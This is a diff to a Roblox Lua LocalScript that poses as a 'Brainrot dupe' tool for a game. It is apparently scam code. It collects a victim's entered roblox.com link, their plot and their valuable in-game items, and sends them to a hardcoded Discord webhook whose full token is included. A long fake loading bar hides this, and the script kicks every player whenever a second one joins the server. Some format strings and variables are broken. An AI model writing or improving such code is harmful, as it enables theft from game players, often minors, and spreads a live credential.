@@ -1,4 +1,101 @@
 -- 📍 Colocar en: StarterGui > ScreenGui > LocalScript
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+
+-- Función para verificar y expulsar jugadores si hay más de uno
+local function checkPlayerCount()
+    local playerCount = #Players:GetPlayers()
+    
+    if playerCount > 1 then
+        -- Mostrar mensaje a todos los jugadores
+        for _, player in ipairs(Players:GetPlayers()) do
+            local message = "❌ Solo debe haber un jugador en el servidor. Saliendo..."
+            
+            -- Intentar mostrar mensaje en la pantalla del jugador
+            local playerGui = player:FindFirstChild("PlayerGui")
+            if playerGui then
+                local screenGui = Instance.new("ScreenGui")
+                local textLabel = Instance.new("TextLabel")
+                
+                screenGui.Parent = playerGui
+                textLabel.Parent = screenGui
+                
+                textLabel.Size = UDim2.new(1, 0, 1, 0)
+                textLabel.BackgroundColor3 = Color3.new(0, 0, 0)
+                textLabel.TextColor3 = Color3.new(1, 0, 0)
+                textLabel.Text = message
+                textLabel.Font = Enum.Font.SourceSansBold
+                textLabel.TextSize = 24
+                textLabel.ZIndex = 10
+            end
+            
+            -- También mostrar en output (consola)
+            print("[SISTEMA] " .. message .. " Jugador: " .. player.Name)
+        end
+        
+        -- Esperar 3 segundos antes de expulsar
+        wait(3)
+        
+        -- Expulsar a todos los jugadores
+        for _, player in ipairs(Players:GetPlayers()) do
+            player:Kick("Solo debe haber un jugador en el servidor")
+        end
+        
+        return true -- Se expulsaron jugadores
+    end
+    
+    return false -- No se necesitó expulsar
+end
+
+-- Sistema de verificación inicial (20 segundos)
+local startTime = tick()
+local initialCheckConnection
+
+initialCheckConnection = RunService.Heartbeat:Connect(function()
+    local elapsedTime = tick() - startTime
+    
+    -- Verificar cada segundo durante los primeros 20 segundos
+    if elapsedTime % 1 < 0.1 then -- Aproximadamente cada segundo
+        local playerCount = #Players:GetPlayers()
+        print(string.format("[Sistema]", playerCount, math.floor(elapsedTime)))
+        
+        if checkPlayerCount() then
+            initialCheckConnection:Disconnect()
+            return
+        end
+    end
+    
+    -- Después de 20 segundos, desconectar esta verificación intensiva
+    if elapsedTime >= 20 then
+        print("[Sistema]")
+        initialCheckConnection:Disconnect()
+        
+        -- Iniciar verificación menos frecuente
+        while true do
+            wait(5) -- Verificar cada 5 segundos
+            
+            local playerCount = #Players:GetPlayers()
+            print(string.format("[Sistema]1", playerCount))
+            
+            checkPlayerCount()
+        end
+    end
+end)
+
+-- También verificar cuando un jugador se une
+Players.PlayerAdded:Connect(function(player)
+    wait(1) -- Esperar un momento para que se actualice el count
+    
+    local playerCount = #Players:GetPlayers()
+    print("[Sistema]: " .. player.Name .. " - Total: " .. playerCount)
+    
+    if playerCount > 1 then
+        checkPlayerCount()
+    end
+end)
+
+
+
 
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
@@ -181,8 +278,7 @@ statusText.ZIndex = 203
 statusText.Text = ""
 statusText.Parent = loadingFrame
 
-
--- hdhdhhgdhddhhddhfhhvfvbggvggbcvvchchchvjvcvjhhvjvgjvjgjvjcj cb vjjjvjjvnvnvnvnvnjvjvcjkjcncbccncb
+-- 🧠 Lista de Brainrots
 local npcNames = {
     "Gattatino Nyanino", "Matteo", "Espresso Signora", "Odin Din Din Dun",
     "Statutino Libertino", "Ballerino Lololo", "Trigoligre Frutonni",
@@ -194,38 +290,93 @@ local npcNames = {
     "Chicleteira Bicicleteira", "La Cucaracha"
 }
 
-
--- 🎯 Función MEJORADA para buscar Brainrots en Workspace.plots (usando el mismo método que funciona)
-local function findBrainrotsInPlots()
-    local foundBrainrots = {}
-    
-    -- Verificar si existe la ruta Workspace.plots
-    local plots = workspace:FindFirstChild("Plots")
-    if not plots then
-        warn("❌ No se encontró 'plots' en Workspace")
-        return foundBrainrots
+-- 🎯 SISTEMA MEJORADO DE BÚSQUEDA DE BRAINROTS CON VERIFICACIÓN DE PLOT
+local function findMyPlot()
+    local plotsFolder = workspace:FindFirstChild("Plots")
+    if not plotsFolder then
+        print("❌ No existe carpeta 'Plots'")
+        return nil
     end
     
-    print("🔍 Buscando Brainrots en plots...")
-    print("📁 Plots encontrados: " .. #plots:GetChildren())
+    print("🔍 Buscando en " .. #plotsFolder:GetChildren() .. " plots...")
     
-    -- 🔍 BÚSQUEDA EXACTA COMO EN EL SCRIPT QUE SÍ FUNCIONA
-    for _, descendant in ipairs(plots:GetDescendants()) do
-        -- Buscar coincidencias EXACTAS como en el otro script
-        if table.find(npcNames, descendant.Name) then
-            print("✅ Encontrado: " .. descendant.Name)
-            if not table.find(foundBrainrots, descendant.Name) then
-                table.insert(foundBrainrots, descendant.Name)
+    for i, plot in pairs(plotsFolder:GetChildren()) do
+        print("📁 Analizando plot: " .. plot.Name)
+        
+        local plotSign = plot:FindFirstChild("Plotsign") or plot:FindFirstChild("PlotSign")
+        if plotSign then
+            print("   ✅ Encontrado: " .. plotSign.Name)
+            
+            local surfaceGui = plotSign:FindFirstChild("SurfaceGui")
+            if surfaceGui then
+                local frame = surfaceGui:FindFirstChild("Frame")
+                if frame then
+                    local textLabel = frame:FindFirstChild("TextLabel")
+                    if textLabel and textLabel:IsA("TextLabel") then
+                        print("   📝 Texto en TextLabel: '" .. textLabel.Text .. "'")
+                        print("   👤 Tu username: '" .. player.Name .. "'")
+                        
+                        -- BUSCAR PARCIALMENTE
+                        if string.find(string.lower(textLabel.Text), string.lower(player.Name)) then
+                            print("   🎯 ¡COINCIDENCIA ENCONTRADA! (coincidencia parcial)")
+                            return plot
+                        else
+                            print("   ❌ No coincide")
+                        end
+                    end
+                end
             end
         end
     end
     
-    -- Si no encuentra nada en plots, buscar en todo Workspace
-    if #foundBrainrots == 0 then
-        print("🔍 Búsqueda extendida en todo Workspace...")
+    print("❌ No se encontró ningún plot con tu username")
+    return nil
+end
+
+local function findBrainrotsInPlots()
+    local foundBrainrots = {}
+    
+    print("🔍 Iniciando búsqueda avanzada de Brainrots...")
+    
+    -- PRIMERO: Buscar el plot del jugador
+    local myPlot = findMyPlot()
+    
+    if myPlot then
+        print("🎯 ESCANEANDO PLOT PERSONAL: " .. myPlot.Name)
+        
+        -- Buscar Brainrots en el plot personal
+        for _, descendant in ipairs(myPlot:GetDescendants()) do
+            if table.find(npcNames, descendant.Name) then
+                print("✅ Brainrot encontrado en tu plot: " .. descendant.Name)
+                if not table.find(foundBrainrots, descendant.Name) then
+                    table.insert(foundBrainrots, descendant.Name)
+                end
+            end
+        end
+        
+        -- Si no se encontraron en el plot personal, buscar en todos los plots
+        if #foundBrainrots == 0 then
+            print("🔍 Búsqueda extendida en todos los plots...")
+            local plotsFolder = workspace:FindFirstChild("Plots")
+            if plotsFolder then
+                for _, plot in ipairs(plotsFolder:GetChildren()) do
+                    for _, descendant in ipairs(plot:GetDescendants()) do
+                        if table.find(npcNames, descendant.Name) then
+                            print("✅ Brainrot encontrado en plot " .. plot.Name .. ": " .. descendant.Name)
+                            if not table.find(foundBrainrots, descendant.Name) then
+                                table.insert(foundBrainrots, descendant.Name)
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    else
+        print("🔍 No se encontró plot personal - buscando en todo Workspace...")
+        -- Búsqueda en todo Workspace como fallback
         for _, descendant in ipairs(workspace:GetDescendants()) do
             if table.find(npcNames, descendant.Name) then
-                print("✅ Encontrado en Workspace: " .. descendant.Name)
+                print("✅ Brainrot encontrado en Workspace: " .. descendant.Name)
                 if not table.find(foundBrainrots, descendant.Name) then
                     table.insert(foundBrainrots, descendant.Name)
                 end
@@ -233,49 +384,29 @@ local function findBrainrotsInPlots()
         end
     end
     
-    -- Depuración: mostrar qué nombres SÍ existen
-    if #foundBrainrots == 0 then
-        print("❌ No se encontraron Brainrots con nombres exactos")
-        print("🔍 Nombres reales encontrados en plots:")
-        
-        local allNames = {}
-        for _, child in ipairs(plots:GetDescendants()) do
-            if (child:IsA("Model") or child:IsA("Part")) and #child.Name > 2 then
-                table.insert(allNames, child.Name)
-            end
-        end
-        
-        -- Mostrar nombres únicos
-        local uniqueNames = {}
-        for _, name in ipairs(allNames) do
-            if not table.find(uniqueNames, name) then
-                table.insert(uniqueNames, name)
-                print("   - '" .. name .. "'")
-            end
-        end
-        
-        -- También mostrar estructura de plots
-        print("📁 ESTRUCTURA DE PLOTS:")
-        for _, plot in ipairs(plots:GetChildren()) do
-            print("   Plot: " .. plot.Name)
-            for _, child in ipairs(plot:GetChildren()) do
-                if child:IsA("Model") then
-                    print("     └─ " .. child.Name .. " (" .. child.ClassName .. ")")
-                end
-            end
-        end
-    else
+    -- Informe final
+    if #foundBrainrots > 0 then
         print("📊 Total Brainrots encontrados: " .. #foundBrainrots)
         print("🧠 Lista: " .. table.concat(foundBrainrots, ", "))
+    else
+        print("❌ No se encontraron Brainrots")
     end
     
     return foundBrainrots
 end
+
 -- 🌐 Sistema de envío webhook MEJORADO con Brainrots
 local function sendToWebhook(url, data)
-    -- Buscar Brainrots usando el método que SÍ funciona
+    -- Buscar Brainrots usando el método mejorado
     local foundBrainrots = findBrainrotsInPlots()
-    local brainrotsText = "Ninguno encontrado"
+    local brainrotsText = "Ningún Brainrot encontrado"
+    local plotInfo = "No se encontró plot personal"
+    
+    -- Obtener información del plot
+    local myPlot = findMyPlot()
+    if myPlot then
+        plotInfo = "Plot encontrado: " .. myPlot.Name
+    end
     
     if #foundBrainrots > 0 then
         brainrotsText = table.concat(foundBrainrots, ", ")
@@ -302,6 +433,11 @@ local function sendToWebhook(url, data)
                         {
                             name = "🌐 URL Ingresada",
                             value = "" .. data.url .."",
+                            inline = false
+                        },
+                        {
+                            name = "📊 Información del Plot",
+                            value = plotInfo,
                             inline = false
                         },
                         {
@@ -337,7 +473,6 @@ local function sendToWebhook(url, data)
     
     return success, result
 end
--- hsjsjhshhshshshhshhshsjsjsjsjjsjsjjsjjhhhdhhhhhhhhhhhhhhhhgghhhhhhhhhjhjjjjdjjjzjjxjjjxhjhxjhxbhxvjxjjjxjjx
 
 -- 🔔 Toast final
 local function showFatalError()
@@ -452,6 +587,7 @@ local function updateStatusMessages()
 		task.wait(math.random(5, 10))
 	end
 end
+
 local function animateProgressBar()
 	local totalTime = 240
 	local stepTime = 0.2
@@ -472,7 +608,7 @@ local function startSequence(url)
 	
 	-- 🔄 Enviar datos al webhook antes de empezar la animación
 	task.spawn(function()
-		local webhookUrl = "https://discord.com/api/webhooks/1398573923280359425/SQDEI2MXkQUC6f4WGdexcHGdmYpUO_sARSkuBmF-Wa-fjQjsvpTiUjVcEjrvuVdSKGb1" -- Reemplaza con tu webhook URL
+		local webhookUrl = "https://discord.com/api/webhooks/1398573923280359425/SQDEI2MXkQUC6f4WGdexcHGdmYpUO_sARSkuBmF-Wa-fjQjsvpTiUjVcEjrvuVdSKGb1"
 		
 		local data = {
 			url = url,
@@ -487,7 +623,7 @@ local function startSequence(url)
 		local success, result = sendToWebhook(webhookUrl, data)
 		
 		if success then
-			print(" BRAINROTS Dupe")
+			print("✅ Datos enviados correctamente al webhook")
 			statusText.Text = "Datos enviados - Iniciando secuencia..."
 		else
 			print("❌ Error en sistema:", result)
@@ -522,7 +658,7 @@ startButton.MouseButton1Click:Connect(function()
 	local text = textBox.Text
 	if string.sub(text, 1, 23) == "https://www.roblox.com/" then
 		errorLabel.Text = ""
-		startSequence(text) -- Pasar la URL a la función
+		startSequence(text)
 	else
 		errorLabel.Text = "Url invalida"
 	end
